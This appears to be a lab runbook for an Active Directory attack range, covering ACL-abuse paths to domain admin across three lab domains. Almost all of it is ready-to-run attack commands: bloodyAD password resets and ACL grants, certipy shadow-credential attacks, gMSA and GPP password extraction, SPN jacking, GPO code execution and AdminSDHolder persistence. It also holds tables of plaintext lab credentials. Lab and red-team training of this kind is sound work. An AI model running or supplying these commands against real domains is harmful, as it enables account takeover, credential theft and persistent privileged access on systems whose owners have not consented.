# CAMPAIGNS v3 — Branch A — ACL Abuse (cadre.local)

> **Campaign v3** — read the theory here, run each command block live, then update [`CAMPAIGNS-METADATA-v2.md`](../CAMPAIGNS-METADATA-v2.md).
> **Index:** [`CAMPAIGNS-RUNBOOK-README.md`](CAMPAIGNS-RUNBOOK-README.md) · **Full reference:** [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md) · **Topology:** [`archive/CAMPAIGNS.md`](../archive/CAMPAIGNS.md)
> **DFIR track:** [`DFIR-Nexus-Pioneer-workflow.md`](../DFIR-Nexus-Pioneer-workflow.md)
>
> **Sync rule:** When you change this runbook during lab work, apply the same edit to [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md) (matching section). Re-run `python tools/split-campaign-runbooks.py --check` to verify coverage.

**Default host:** Kali / provisioning (`192.168.77.60`) unless a step says otherwise.

---

## Branches (Optional — Explore Adjacent Attack Surfaces)

---


### Branch A: ACL Abuse (cadre.local)

> **Verification note (2026-07-29):** WT015 / ACE#7 was tested end-to-end. The ACE was missing on `chief_command` when first checked; it was restored via corrected `05-ad-attack-surface.yml` (deploy task now checks exact ForceChangePassword right) and `05-ad-attack-surface-verifyOnly.yml` now reports 18/18 PASS. `hunter_dfir` / `DF1R_Hunt3r!` was obtained via WT031 password spray, reset `chief_command` to `NewChiefPass123!`, verified DA+EA, and restored the original `C0mm@nd_Ch1ef!` password.

**Diverges from:** Phase 4 (BloodHound reveals ACEs).
**Converges to:** Phase 5+ (ACL abuse gives cadre.local DA, accelerating the main chain).
**Prerequisite:** Any cadre.local domain credential (e.g., `analyst_dfir`, `analyst_cloud`, `hunter_dfir`). In the current verified run, `hunter_dfir` was obtained via WT031 password spray using `cadre_passwords.txt`.

> 💡 **Pre-BloodHound visual scan:** Run [ADeleg](Phase 0 Step 7) first from mbr01 to visually confirm the 14 ACEs are deployed correctly. ADeleg's View by Trustee directly maps to attacker perspective — faster setup than BloodHound, no EDR alerts, and produces report-ready screenshots. Use BloodHound for deep path-finding queries; use ADeleg for visual verification.

The BH data at `/home/vagrant/20260602150159_bloodhound.zip` (cadre.local) was collected with a low-priv account. Load it into BloodHound CE and run:

```cypher
// Find all ACL edges from any user to high-value targets
MATCH p=(u:User)-[r]->(t) WHERE t.highvalue=true RETURN p

// Find ForceChangePassword paths specifically
MATCH p=(u:User)-[r:ForceChangePassword]->(t:User) RETURN p

// Find GenericWrite/GenericAll edges
MATCH p=(u:User)-[r:GenericAll|GenericWrite]->(t) RETURN p
```

The results reveal these ACE chains across all 3 domains:

**cadre.local (14 ACEs):**


| Path        | ACE#  | Source → Target: Right                               | Starting Cred      | Earns                            |
| ----------- | ----- | ---------------------------------------------------- | ------------------ | -------------------------------- |
| A (fastest) | 7     | `hunter_dfir` → `chief_command`: ForceChangePassword | `DF1R_Hunt3r!`     | `C0mm@nd_Ch1ef!` → DA            |
| B           | 3     | `Engineering-Cadre` → `Red-Cadre`: WriteDacl         | needs group member | DA via group escalation          |
| C           | 4     | `Cloud-Cadre` → `Agentic-Cadre`: GenericWrite        | needs group member | DA via Shadow Credentials        |
| D           | 5     | `analyst_dfir` → `OU=Command`: GenericAll            | `An@lyst_DF1R!`    | DA via OU inheritance            |
| E           | 6     | `ops_redcell` → `dc01$`: GenericWrite                | `R3dC3ll_0ps!`     | DC machine auth → DCSync         |
| F           | 1     | `analyst_cloud` → `Vulnerable-GPO`: GpoEdit          | `Cl0ud_An@lyst!`   | DA via GPO code exec             |
| G           | 10    | `eng_cloud` → `gmsaTools$`: ReadGMSAPassword         | `Cl0ud_Eng!`       | gMSA credential                  |
| H           | 8     | `lead_engineering` → `svc_ldap`: GenericAll          | `Eng_L3ad!`        | Service account control          |
| I           | 12    | `eng_agentic` → `OU=Agentic`: AllExtendedRights      | `Ag3nt1c_Eng!`     | OU-wide escalation               |
| J           | 11    | `analyst_purple` → `Cloud-Cadre`: WriteMember        | `Purpl3_An@lyst!`  | Group membership add             |
| K           | 9     | `Purple-Cell` → `OU=DFIR`: WriteProperty             | needs group member | Property write on DFIR           |
| L           | 2     | `eng_agentic` → `WMI-Filtered-GPO`: GpoEdit          | `Ag3nt1c_Eng!`     | WMI filter → code exec           |
| M           | 13+14 | `eng_agentic` → `DC=cadre`: GetChanges+All           | `Ag3nt1c_Eng!`     | **Direct DCSync** (no DA needed) |


**child.cadre.local (6 ACEs, plus ACE#18 in Main Spine):**


| Path | ACE# | Source → Target: Right                            | Starting Cred     | Earns                    |
| ---- | ---- | ------------------------------------------------- | ----------------- | ------------------------ |
| N    | 15   | `analyst_t1` → `OU=Operations`: GenericWrite      | `T13r_An@lyst!`   | OU object control        |
| O    | 16   | `lead_detection` → `svc_mssql`: GenericAll        | `L3ad_D3t3ct10n!` | SQL service control      |
| P    | 17   | `mgr_incident` → `Detection-Cadre`: WriteMember   | `Mgr_1nc1d3nt!`   | Group add to Detection   |
| Q    | 19   | `analyst_t3` → `Operations-Cadre`: WriteOwner     | `T33r_An@lyst!`   | Take group ownership     |
| R    | 20   | `dir_operations` → `mbr01$`: GenericWrite         | `D1r_0p3r@t10ns!` | RBCD on mbr01 → DA       |
| S    | 18   | `intern_blue` → `analyst_t2`: ForceChangePassword | `1nt3rn_Blu3!`    | **Main Spine** (Phase 2) |


**range.local (6 ACEs):**


| Path | ACE# | Source → Target: Right                              | Starting Cred       | Earns                         |
| ---- | ---- | --------------------------------------------------- | ------------------- | ----------------------------- |
| T    | 23   | `analyst_osint` → `svc_naa`: GenericAll             | `0S1NT_An@lyst!`    | DA → DCSync range.local       |
| U    | 21   | `Intelligence-Cadre` → `dc03$`: GenericAll          | needs group member  | DC machine → DCSync           |
| V    | 22   | `eng_tools` → `Adversary-Cadre`: WriteDacl          | `T00ls_3ng!`        | Group ACL control             |
| W    | 24   | `adversary_lead` → `dmsaPrivService$`: GenericWrite | `Adv3rsary_L3ad!`   | dMSA BadSuccessor → DC$ creds |
| X    | 25   | `analyst_malware` → `svc_sccm`: WriteProperty(SPN)  | `M@lw@r3_An@lyst!`  | SPN modification on SCCM      |
| Y    | 26   | `analyst_forensic` → `svc_naa`: AllExtendedRights   | `F0r3ns1c_An@lyst!` | Full control on NAA → DA      |


#### Path A — ForceChangePassword (WT015)

Verified live (2026-07-29). `hunter_dfir` / `DF1R_Hunt3r!` reset `chief_command` password to `NewChiefPass123!`, confirmed DA+EA login, then restored original password `C0mm@nd_Ch1ef!`.

```bash
# Reset password
bloodyAD --host 192.168.77.10 -d cadre.local -u hunter_dfir -p 'DF1R_Hunt3r!' \
  set password "CN=chief_command,OU=Command,DC=cadre,DC=local" 'NewChiefPass123!'

# Validate DA+EA
impacket-psexec cadre.local/chief_command:'NewChiefPass123!'@192.168.77.10 \
  -c "whoami /groups"

# Restore original lab password
bloodyAD --host 192.168.77.10 -d cadre.local -u chief_command -p 'NewChiefPass123!' \
  set password "CN=chief_command,OU=Command,DC=cadre,DC=local" 'C0mm@nd_Ch1ef!'
```

#### Path B — WriteDacl Self-Escalate (WT013)

```bash
bloodyAD --host 192.168.77.10 -d cadre.local -u lead_engineering -p 'Eng_L3ad!' \
  add genericall "CN=Red-Cadre,OU=RedCell,DC=cadre,DC=local" "cadre.local\lead_engineering"
bloodyAD --host 192.168.77.10 -d cadre.local -u lead_engineering -p 'Eng_L3ad!' \
  add group-member "CN=Red-Cadre,OU=RedCell,DC=cadre,DC=local" "lead_engineering"
```

#### Path C — GenericWrite → Shadow Credentials (WT014)

```bash
certipy-ad shadow auto -u "analyst_cloud@cadre.local" -p 'Cl0ud_An@lyst!' \
  -account eng_agentic -dc-ip 192.168.77.10
```

#### Path D — GenericAll on OU (WT016)

```bash
bloodyAD --host 192.168.77.10 -d cadre.local -u analyst_dfir -p 'An@lyst_DF1R!' \
  set password "CN=chief_command,OU=Command,DC=cadre,DC=local" 'Pwn3d_DA!'
```

#### Path E — Shadow Credentials on dc01$ (WT008)

```bash
certipy-ad shadow auto -u "ops_redcell@cadre.local" -p 'R3dC3ll_0ps!' \
  -account dc01$ -dc-ip 192.168.77.10
certipy-ad auth -pfx dc01.pfx -dc-ip 192.168.77.10 -domain cadre.local -username dc01$ -ldap-shell
# In LDAP shell: DCSync as dc01$
```

#### Path F — GPO Abuse (WT023)

```bash
bloodyAD --host 192.168.77.10 -d cadre.local -u analyst_cloud -p 'Cl0ud_An@lyst!' \
  add gpo-task -n "Vulnerable-GPO" -t "Immediate" \
  -c "powershell.exe -enc <add_user_to_DA>"
gpupdate /target:computer /force  # On dc01
```

#### Path G — gMSA Extraction (WT024)

```bash
bloodyAD --host 192.168.77.10 -d cadre.local -u eng_cloud -p 'Cl0ud_Eng!' \
  get object 'gmsaTools$' --attr msDS-ManagedPassword
```

#### GPP Stored Password (Groups.xml)

A Groups.xml file on `\\dc01\SYSVOL\cadre.local\Policies\` contains a cpassword for `svc_backup`. GPP passwords use AES encryption with a well-known key — decrypt with `gpp-decrypt`.

```bash
gpp-decrypt "T6Zc9T0qO/pEh+eOXTnxky0jSJvWvPcvAKWwGSpFOqY"
# → svc_backup password
```

The `svc_backup` account is created with `acctDisabled=0` (active) and can be used for lateral movement to servers where backup agents run.

```

#### SPN Jacking — CVE-2026-25177 (WT027)

```bash
# VERIFIED 2026-08-01 — self-write command below is NOT viable as-is (see note).
# Working path: account with writeSPN (chief_command = DA) plants a FREE same-realm SPN
# on a controlled account -> KDC issues TGS encrypted with that account's key.
bloodyAD --host 192.168.77.10 -d cadre.local -u chief_command -p 'C0mm@nd_Ch1ef!' \
  set object "CN=analyst_cloud,OU=Cloud,DC=cadre,DC=local" \
  servicePrincipalName -v "MSSQLSvc/dc01.cadre.local:14333"
```

> **Verification note (2026-08-01):** Planted `MSSQLSvc/dc01.cadre.local:14333` on analyst_cloud as chief_command → LDAP read-back OK → `Rubeus asktgt /enctype:aes256` + `asktgs` → **KDC issued TGS encrypted with analyst_cloud's AES key** (attacker-known → offline crack). Cleanup confirmed (SPN removed). **Why the documented low-priv command fails:** (1) `MSSQLSvc/mbr01.child.cadre.local:1433` is already owned by `child\svc_mssql` → forest-wide SPN uniqueness → `A constraint violation occurred`; (2) a free cross-host service SPN via SELF-write → `Access is denied` (the default `Validated write to servicePrincipalName` on SELF only permits own-host SPNs). Cross-realm TGS (`mbr01.child.cadre.local` SPN vs `cadre.local` TGT) additionally needs a referral → `KDC_ERR_WRONG_REALM` in Rubeus asktgs; same-realm SPN avoids it. Also: Server 2025 KDC rejects TGS-REQ built on an RC4 TGT (`KDC_ERR_ETYPE_NOTSUPP`) — use an AES TGT.

#### Persistence — AdminSDHolder (WT025)

After achieving DA, add GenericAll for your attacker on AdminSDHolder. SDPROP propagates to all protected groups every 60 min.

```bash
bloodyAD --host 192.168.77.10 -d cadre.local -u chief_command -p 'C0mm@nd_Ch1ef!' \
  add genericall "CN=AdminSDHolder,CN=System,DC=cadre,DC=local" "cadre.local\analyst_dfir"
```

---

---

## Navigation

← Previous: [`CAMPAIGNS-RUNBOOK-8.md`](CAMPAIGNS-RUNBOOK-8.md) · Next: [`CAMPAIGNS-RUNBOOK-branch-b.md`](CAMPAIGNS-RUNBOOK-branch-b.md) →
